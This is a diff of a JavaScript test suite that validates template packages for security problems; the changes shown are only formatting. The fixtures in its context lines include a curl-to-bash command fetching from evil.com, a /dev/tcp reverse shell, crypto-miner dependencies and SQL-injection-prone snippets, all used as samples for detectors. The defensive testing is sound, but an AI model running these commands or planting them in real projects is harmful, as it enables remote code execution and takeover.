@@ -60,20 +60,20 @@ describe('Template Package Security Validation', () => {
   let tempDir;
   let templatePath;
 
-  beforeEach(async () => {
+  beforeEach(async() => {
     tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'template-test-'));
     templatePath = path.join(tempDir, 'malicious-template');
     await fs.ensureDir(templatePath);
   });
 
-  afterEach(async () => {
+  afterEach(async() => {
     if (tempDir && fs.existsSync(tempDir)) {
       await fs.remove(tempDir);
     }
   });
 
   describe('1. Malicious package.json Validation', () => {
-    test('should reject templates with malicious scripts in package.json', async () => {
+    test('should reject templates with malicious scripts in package.json', async() => {
       const maliciousPackageJson = {
         name: 'malicious-template',
         version: '1.0.0',
@@ -93,7 +93,7 @@ describe('Template Package Security Validation', () => {
       expect(result.errors).toContain('Malicious postinstall script detected');
     });
 
-    test('should reject templates with suspicious dependencies', async () => {
+    test('should reject templates with suspicious dependencies', async() => {
       const suspiciousPackageJson = {
         name: 'suspicious-template',
         version: '1.0.0',
@@ -135,7 +135,7 @@ describe('Template Package Security Validation', () => {
   });
 
   describe('2. Executable Scripts Validation', () => {
-    test('should block executable scripts in suspicious locations', async () => {
+    test('should block executable scripts in suspicious locations', async() => {
       // Create executable scripts in suspicious locations
       const suspiciousPaths = [
         '.hidden/script.sh',
@@ -159,7 +159,7 @@ describe('Template Package Security Validation', () => {
       expect(result.errors).toContain('Executable script found in config directory: config/executable.js');
     });
 
-    test('should reject scripts with suspicious content patterns', async () => {
+    test('should reject scripts with suspicious content patterns', async() => {
       const scriptContent = `
         #!/bin/bash
         curl -s http://evil.com/malware.sh | bash
@@ -181,7 +181,7 @@ describe('Template Package Security Validation', () => {
       expect(result.errors).toContain('Dangerous file deletion detected');
     });
 
-    test('should block scripts with reverse shell patterns', async () => {
+    test('should block scripts with reverse shell patterns', async() => {
       const reverseShellScript = `
         #!/bin/bash
         bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
@@ -201,7 +201,7 @@ describe('Template Package Security Validation', () => {
   });
 
   describe('3. Suspicious Dependencies Detection', () => {
-    test('should flag dependencies from known malicious registries', async () => {
+    test('should flag dependencies from known malicious registries', async() => {
       const maliciousRegistryPackage = {
         name: 'test-template',
         version: '1.0.0',
@@ -221,14 +221,14 @@ describe('Template Package Security Validation', () => {
       expect(result.errors).toContain('Dependency from untrusted source: http://evil.com/package');
     });
 
-    test('should detect dependencies with known vulnerabilities', async () => {
+    test('should detect dependencies with known vulnerabilities', async() => {
       const vulnerablePackage = {
         name: 'test-template',
         version: '1.0.0',
         dependencies: {
           'lodash': '4.17.15', // Known vulnerable version
-          'express': '4.16.0',  // Known vulnerable version
-          'react': '16.8.0'     // Known vulnerable version
+          'express': '4.16.0', // Known vulnerable version
+          'react': '16.8.0' // Known vulnerable version
         }
       };
 
@@ -242,14 +242,14 @@ describe('Template Package Security Validation', () => {
       expect(scanResult.vulnerabilities[0].severity).toBe('high');
     });
 
-    test('should flag dependencies with excessive network access', async () => {
+    test('should flag dependencies with excessive network access', async() => {
       const networkHeavyPackage = {
         name: 'test-template',
         version: '1.0.0',
         dependencies: {
-          'coin-hive': '^1.0.0',  // Crypto miner
+          'coin-hive': '^1.0.0', // Crypto miner
           'p2p-network': '^2.0.0', // P2P network
-          'tor-client': '^1.0.0'   // Tor client
+          'tor-client': '^1.0.0' // Tor client
         }
       };
 
@@ -264,12 +264,12 @@ describe('Template Package Security Validation', () => {
   });
 
   describe('4. File Permissions Validation', () => {
-    test('should reject templates with insecure file permissions', async () => {
+    test('should reject templates with insecure file permissions', async() => {
       // Create files with insecure permissions
       const filesWithBadPerms = [
         { path: 'config/database.json', perm: '777' },
         { path: 'scripts/install.sh', perm: '4777' }, // Setuid
-        { path: 'bin/executable', perm: '2777' },    // Setgid
+        { path: 'bin/executable', perm: '2777' }, // Setgid
         { path: 'tmp/socket', perm: '666' }
       ];
 
@@ -290,7 +290,7 @@ describe('Template Package Security Validation', () => {
       expect(result.errors).toContain('World-writable file detected');
     });
 
-    test('should reject templates with world-writable directories', async () => {
+    test('should reject templates with world-writable directories', async() => {
       const worldWritableDir = path.join(templatePath, 'public');
       await fs.ensureDir(worldWritableDir);
 
@@ -301,7 +301,7 @@ describe('Template Package Security Validation', () => {
       expect(result.errors).toContain('World-writable directory detected');
     });
 
-    test('should block files with setuid/setgid bits', async () => {
+    test('should block files with setuid/setgid bits', async() => {
       const suidFile = path.join(templatePath, 'bin/suid-executable');
       await fs.ensureDir(path.dirname(suidFile));
       await fs.writeFile(suidFile, 'content');
@@ -314,7 +314,7 @@ describe('Template Package Security Validation', () => {
   });
 
   describe('5. Source Authorization Validation', () => {
-    test('should block templates from unauthorized sources', async () => {
+    test('should block templates from unauthorized sources', async() => {
       const unauthorizedSources = [
         'http://untrusted.com/template.tar.gz',
         'https://suspicious.org/repo.git',
@@ -330,7 +330,7 @@ describe('Template Package Security Validation', () => {
       }
     });
 
-    test('should validate template source signatures', async () => {
+    test('should validate template source signatures', async() => {
       const templateWithInvalidSignature = {
         source: 'https://registry.npmjs.org/template',
         signature: 'invalid-signature-data',
@@ -343,7 +343,7 @@ describe('Template Package Security Validation', () => {
       expect(result.errors).toContain('Invalid template signature');
     });
 
-    test('should require trusted certificate authorities', async () => {
+    test('should require trusted certificate authorities', async() => {
       const templateWithUntrustedCA = {
         source: 'https://untrusted-ca.com/template',
         certificate: 'untrusted-certificate'
@@ -357,7 +357,7 @@ describe('Template Package Security Validation', () => {
   });
 
   describe('6. Package Integrity Verification', () => {
-    test('should verify package checksums', async () => {
+    test('should verify package checksums', async() => {
       const templateWithChecksum = {
         files: [
           { path: 'index.js', checksum: 'invalid-checksum' },
@@ -371,7 +371,7 @@ describe('Template Package Security Validation', () => {
       expect(result.errors).toContain('Checksum verification failed');
     });
 
-    test('should detect package tampering', async () => {
+    test('should detect package tampering', async() => {
       // Create original files
       await fs.writeJson(path.join(templatePath, 'package.json'), { name: 'test' });
       await fs.writeFile(path.join(templatePath, 'index.js'), 'console.log("hello");');
@@ -394,7 +394,7 @@ describe('Template Package Security Validation', () => {
       expect(result.errors).toContain('Package tampering detected');
     });
 
-    test('should validate digital signatures', async () => {
+    test('should validate digital signatures', async() => {
       const unsignedPackage = {
         signature: null,
         publicKey: null
@@ -408,7 +408,7 @@ describe('Template Package Security Validation', () => {
   });
 
   describe('7. Security Best Practices Validation', () => {
-    test('should enforce security policies', async () => {
+    test('should enforce security policies', async() => {
       const insecurePackage = {
         name: 'insecure-template',
         version: '1.0.0',
@@ -428,10 +428,10 @@ describe('Template Package Security Validation', () => {
       expect(result.errors).toContain('Security policy violation: insecure dependencies');
     });
 
-    test('should require security headers and policies', async () => {
+    test('should require security headers and policies', async() => {
       const missingSecurityHeaders = {
         name: 'template-missing-security',
-        version: '1.0.0',
+        version: '1.0.0'
         // Missing security-related configurations
       };
 
@@ -443,7 +443,7 @@ describe('Template Package Security Validation', () => {
       expect(result.errors).toContain('Missing security policy configuration');
     });
 
-    test('should validate secure coding practices', async () => {
+    test('should validate secure coding practices', async() => {
       const insecureCode = `
         const userInput = req.query.user;
         const query = "SELECT * FROM users WHERE name = '" + userInput + "'";
@@ -466,7 +466,7 @@ describe('Template Package Security Validation', () => {
   });
 
   describe('8. Security Scanning', () => {
-    test('should identify potential vulnerabilities', async () => {
+    test('should identify potential vulnerabilities', async() => {
       const vulnerableTemplate = {
         name: 'vulnerable-template',
         version: '1.0.0',
@@ -486,7 +486,7 @@ describe('Template Package Security Validation', () => {
       expect(scanResult.vulnerabilities.some(v => v.severity === 'critical')).toBe(true);
     });
 
-    test('should detect malware patterns', async () => {
+    test('should detect malware patterns', async() => {
       const malwareCode = `
         // Crypto mining malware
         const miner = new CoinHive.Anonymous('malicious-key');
@@ -512,7 +512,7 @@ describe('Template Package Security Validation', () => {
       expect(scanResult.threats).toContain('Keylogging behavior detected');
     });
 
-    test('should perform static code analysis', async () => {
+    test('should perform static code analysis', async() => {
       const codeWithVulnerabilities = `
         function authenticate(username, password) {
           const query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
@@ -541,7 +541,7 @@ describe('Template Package Security Validation', () => {
       expect(scanResult.staticAnalysisResults).toContain('Path traversal');
     });
 
-    test('should generate security report', async () => {
+    test('should generate security report', async() => {
       const scanResult = await scanForVulnerabilities(templatePath);
 
       expect(scanResult.report).toBeDefined();
@@ -553,7 +553,7 @@ describe('Template Package Security Validation', () => {
   });
 
   describe('9. Integration Tests', () => {
-    test('should perform comprehensive security validation', async () => {
+    test('should perform comprehensive security validation', async() => {
       // Create a template with multiple security issues
       await fs.writeJson(path.join(templatePath, 'package.json'), {
         name: 'comprehensive-malicious',
@@ -596,7 +596,7 @@ describe('Template Package Security Validation', () => {
       expect(integrityResult.errors.length).toBeGreaterThan(0);
     });
 
-    test('should handle validation edge cases', async () => {
+    test('should handle validation edge cases', async() => {
       // Test with non-existent template path
       const nonExistentPath = '/non/existent/path';
       const result = await validateTemplatePackage(nonExistentPath);
